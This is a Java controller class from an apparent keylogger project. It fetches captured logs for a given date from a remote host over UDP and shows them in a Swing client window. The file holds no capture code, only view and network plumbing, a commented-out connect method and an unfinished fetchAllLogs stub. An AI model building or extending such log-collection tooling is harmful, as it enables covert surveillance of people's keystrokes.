package com.hao.keylogger.controllers.Client;

import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Date;

import javax.swing.JFrame;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ClientView;

public class ClientLogController {
	private ClientView logView;
	private Log log;
	
	UDPClientHelper udpClientHelper;

	public ClientLogController(ClientView logView) {
		super();
		this.logView = logView;
		this.logView.setController(this);
	}

	public JFrame getLogView() {
		return logView;
	}

	public void setLogView(ClientView logView) {
		this.logView = logView;
	}

	public Log getLog() {
		return log;
	}

	public void setLog(Log log) {
		this.log = log;
	}

	public void loadView() {
		//logView.setHost(log.getHost());
		//logView.setPort(log.getPort());
		logView.setLogContent(log.getContent());
	}

	/*
	public boolean connect() {
		InetAddress hostName = logView.getHost();
		int port = logView.getPort();
		try {
			udpClientHelper = UDPClientHelper.getInstance(hostName, port);
			udpClientHelper.connect();
			return true;
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		return false;
	}
	*/
	
	public void fetchLog(Date date) throws NullPointerException {
		try {
			log = new UDPClientHelper(logView.getHostAddress(), logView.getPort()).fetchLog(date);
			loadView();
		} catch (SocketException | UnknownHostException e) {
			// TODO xử lý fetch không được log
			e.printStackTrace();
		}
		
	}
	
	public void fetchAllLogs() {
		ArrayList<Log> logs = udpClientHelper.fetchAllLogs();
		// load to view
	}

}
